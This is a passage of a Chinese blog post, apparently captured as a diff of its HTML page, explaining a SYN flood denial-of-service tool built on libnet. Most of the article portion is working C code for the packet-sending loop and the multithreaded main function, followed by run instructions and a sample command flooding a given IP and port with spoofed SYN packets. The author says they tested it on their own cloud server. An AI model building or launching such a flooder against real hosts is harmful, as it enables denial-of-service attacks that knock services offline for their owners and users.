class="line">			libnet_timersub(&amp;e, &amp;s, &amp;r);</span><br><span class="line">			<span class="keyword">if</span> (r.tv_sec &lt; <span class="number">1</span>) &#123;</span><br><span class="line">				Sleep((<span class="number">1000000</span> - r.tv_usec)/<span class="number">1000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	libnet_destroy(l);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h1><p>主函数主要处理用户输入参数并将其格式化，之后根据用户输入参数启动发送线程，线程启动间隔 1s，整个攻击默认持续 12 分钟结束，可以通过 <code>CTRL+C</code> 结束。<code>getopt</code> 按照 <code>ip.port</code> 的格式对输入参数 <code>-t</code> 做划分，例如用户指定攻击的目标 IP 为 <code>10.3.8.211</code>，端口 80，则输入参数 <code>-t</code> 对应 <code>10.3.8.211.80</code>。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">libnet_t</span> *l;</span><br><span class="line">    <span class="keyword">char</span> *cp;</span><br><span class="line">    <span class="keyword">char</span> errbuf[LIBNET_ERRBUF_SIZE];</span><br><span class="line">    <span class="keyword">int</span> c, whole_speed = <span class="number">0</span>, thread_num = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">pcap_t</span> *handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	select_adapter(&amp;handle);</span><br><span class="line"></span><br><span class="line">    l = libnet_init(</span><br><span class="line">            LIBNET_RAW4,                            <span class="comment">/* injection type */</span></span><br><span class="line">            name,                                   <span class="comment">/* network interface */</span></span><br><span class="line">            errbuf);                                <span class="comment">/* error buffer */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"libnet_init() failed: %s"</span>, errbuf);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((c = getopt(argc, argv, <span class="string">"t:s:p:"</span>)) != EOF)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                <span class="keyword">if</span> (!(cp = <span class="built_in">strrchr</span>(optarg, <span class="string">'.'</span>)))&#123;</span><br><span class="line">                    usage(argv[<span class="number">0</span>]);</span><br><span class="line">                    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">                &#125;</span><br><span class="line">                *cp++ = <span class="number">0</span>;</span><br><span class="line">                dst_prt = (u_short)atoi(cp);</span><br><span class="line">                <span class="keyword">if</span> ((dst_ip = libnet_name2addr4(l, optarg, <span class="number">1</span>)) == -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Bad IP address: %s\n"</span>, optarg);</span><br><span class="line">                    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                whole_speed = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">                thread_num   = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                usage(argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    libnet_destroy(l);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!dst_prt || !dst_ip)&#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    speed = whole_speed / thread_num;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; thread_num; i++)&#123;</span><br><span class="line">		HANDLE handle = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, send_syn, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (handle &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"can't create send_syn thread!\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    Sleep(<span class="number">1200</span>*<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>生成程序支持三个参数：</p>
+<ul>
+<li><code>-t</code>：设置目标的 IP 地址和端口</li>
+<li><code>-s</code>：设置每个线程每秒钟发送的 SYN 数据包数量，若未指定则默认为 0，即全速发送</li>
+<li><code>-p</code>：设置同时发送 SYN 数据包的线程数</li>
+</ul>
+<p>例如，同时启动 4 个攻击线程，每个线程每秒发送 200 个伪造 SYN 数据包，攻击目标为 <code>10.3.8.211:80</code>：<code>synFlood.exe -t 10.3.8.211.80 -s 200 -p 4</code>。</p>
+<p>启动程序并开始发送后，使用 wireshark 可以捕获到伪造的 SYN 数据包，其中攻击我的 CVM 截图如下，因为 CVM 供应商提供了 DDOS 防护措施，CVM 上的 Web 服务器未收到明显影响。</p>
+<p><img src="http://7xktmz.com1.z0.glb.clouddn.com/syn-flood-attack.jpg" width="400px"></p>
+<hr>
+<p>原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章<a href="http://blog.forec.cn/2016/11/20/ddos-syn-attack/" target="_blank" rel="external">原始出处</a>(<a href="http://blog.forec.cn/2016/11/20/ddos-syn-attack/" target="_blank" rel="external">http://blog.forec.cn/2016/11/20/ddos-syn-attack/</a>) 、作者信息（<a href="http://forec.cn/" target="_blank" rel="external">Forec</a>）和本声明。</p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://forec.github.io/2016/11/20/ddos-syn-attack/" data-id="civqtp6m600404sewzx9etuy5" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div class="ds-thread" data-thread-key="2016/11/20/ddos-syn-attack/" data-title="基于 LibNET 的 SYN Flood 攻击" data-url="http://forec.github.io/2016/11/20/ddos-syn-attack/"></div>
+    <style>
+        #ds-thread #ds-reset .ds-textarea-wrapper {
+            background: none;
+        }
+        #ds-reset .ds-avatar img {
+            box-shadow: none;
+        }
+        #ds-reset .ds-gradient-bg {
+            background: #f7f7f7;
+        }
+        #ds-thread #ds-reset li.ds-tab a {
+            border-radius: 3px;
+        }
+        #ds-thread #ds-reset .ds-post-button {
+            color: white;
+            border: none;
+            box-shadow: none;
+            background: #d32;
+            text-shadow: none;
+            font-weight: normal;
+            font-family: 'Microsoft Yahei';
+        }
+        #ds-thread #ds-reset .ds-post-button:hover {
+            color: white;
+            background: #DE594C;
+        }
+        #ds-thread #ds-reset .ds-post-button:active {
+            background: #d32;
+        }
+        #ds-smilies-tooltip ul.ds-smilies-tabs li a.ds-current {
+            color: white;
+            background: #d32;
+            box-shadow: none;
+            text-shadow: none;
+            font-weight: normal;
+        }
+    </style>
+
+    
+    </section>
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>关注我 :</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/Forec" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="google-plus-circle" href="https://plus.google.com/u/0/103559279723380829001" target="_blank">
+                        <i class="icon fa fa-google-plus-circle"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="facebook" href="https://www.facebook.com/MrForec" target="_blank">
+                        <i class="icon fa fa-facebook"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="twitter" href="https://twitter.com/MrForec" target="_blank">
+                        <i class="icon fa fa-twitter"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="mail-forward" href="mailto:forec@bupt.edu.cn" target="_blank">
+                        <i class="icon fa fa-mail-forward"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2016/11/19/cloud-storage-system-5/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">上一篇</strong>
+        <p class="article-nav-title">简易云存储系统数据用户设计</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/11/20/ddos-syn-attack/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://7xktmz.com1.z0.glb.clouddn.com/ddos-syn-attack.jpg)" alt="基于 LibNET 的 SYN Flood 攻击" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Code/">Code</a></p>
+                            <p class="item-title"><a href="/2016/11/20/ddos-syn-attack/" class="title">基于 LibNET 的 SYN Flood 攻击</a></p>
+                            <p class="item-date"><time datetime="2016-11-20T13:42:03.000Z" itemprop="datePublished">2016-11-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/11/19/cloud-storage-system-5/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://7xktmz.com1.z0.glb.clouddn.com/cloud-storage-system-5.png)" alt="简易云存储系统数据用户设计" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Code/">Code</a></p>
+                            <p class="item-title"><a href="/2016/11/19/cloud-storage-system-5/" class="title">简易云存储系统数据用户设计</a></p>
+                            <p class="item-date"><time datetime="2016-11-19T15:20:42.000Z" itemprop="datePublished">2016-11-19</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/11/18/haskell-fold/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://7xktmz.com1.z0.glb.clouddn.com/haskell-fold.jpg)" alt="Haskell 的 fold 系列" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Language/">Language</a></p>
+                            <p class="item-title"><a href="/2016/11/18/haskell-fold/" class="title">Haskell 的 fold 系列</a></p>
+                            <p class="item-date"><time datetime="2016-11-18T07:10:11.000Z" itemprop="datePublished">2016-11-18</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/11/17/haskell-graham/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://7xktmz.com1.z0.glb.clouddn.com/haskell-graham.png)" alt="Haskell 的葛立恒扫描法" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Code/">Code</a></p>
+                            <p class="item-title"><a href="/2016/11/17/haskell-graham/" class="title">Haskell 的葛立恒扫描法</a></p>
+                            <p class="item-date"><time datetime="2016-11-17T15:50:20.000Z" itemprop="datePublished">2016-11-17</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/11/16/cloud-storage-system-4/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://7xktmz.com1.z0.glb.clouddn.com/cloud-storage-system-4.png)" alt="简易云存储系统传输、认证单元测试" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Code/">Code</a></p>
+                            <p class="item-title"><a href="/2016/11/16/cloud-storage-system-4/" class="title">简易云存储系统传输、认证单元测试</a></p>
+                            <p class="item-date"><time datetime="2016-11-16T03:12:35.000Z" itemprop="datePublished">2016-11-16</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Code/">Code</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Configuration/">Configuration</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Language/">Language</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/大数据/">大数据</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机理论基础/">计算机理论基础</a><span class="category-list-count">6</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Access/" style="font-size: 10px;">Access</a> <a href="/tags/Algorithms/" style="font-size: 20px;">Algorithms</a> <a href="/tags/CVM/" style="font-size: 10px;">CVM</a> <a href="/tags/Data-Structures/" style="font-size: 12.5px;">Data-Structures</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Emacs/" style="font-size: 10px;">Emacs</a> <a href="/tags/Golang/" style="font-size: 16.25px;">Golang</a> <a href="/tags/Hadoop/" style="font-size: 11.25px;">Hadoop</a> <a href="/tags/Haskell/" style="font-size: 12.5px;">Haskell</a> <a href="/tags/Mistakes/" style="font-size: 13.75px;">Mistakes</a> <a href="/tags/OS/" style="font-size: 15px;">OS</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Qt/" style="font-size: 10px;">Qt</a> <a href="/tags/Raspberry/" style="font-size: 10px;">Raspberry</a> <a href="/tags/Safety/" style="font-size: 10px;">Safety</a> <a href="/tags/Spark/" style="font-size: 10px;">Spark</a> <a href="/tags/sicp/" style="font-size: 11.25px;">sicp</a> <a href="/tags/云存储/" style="font-size: 15px;">云存储</a> <a href="/tags/函数式编程/" style="font-size: 13.75px;">函数式编程</a> <a href="/tags/图分割/" style="font-size: 11.25px;">图分割</a> <a href="/tags/字符编码/" style="font-size: 11.25px;">字符编码</a> <a href="/tags/机器学习/" style="font-size: 18.75px;">机器学习</a> <a href="/tags/线程/" style="font-size: 17.5px;">线程</a> <a href="/tags/计算机组成与体系结构/" style="font-size: 10px;">计算机组成与体系结构</a> <a href="/tags/计组与体系结构/" style="font-size: 13.75px;">计组与体系结构</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://forec.cn">Forec的官方网站</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2016 Forec</p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:'forec# enter duoshuo shortname here'};
+    (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js" type="text/javascript"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js" type="text/javascript"></script>
+    
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js" type="text/javascript"></script>
+
+    </div>
+</body>
+</html>
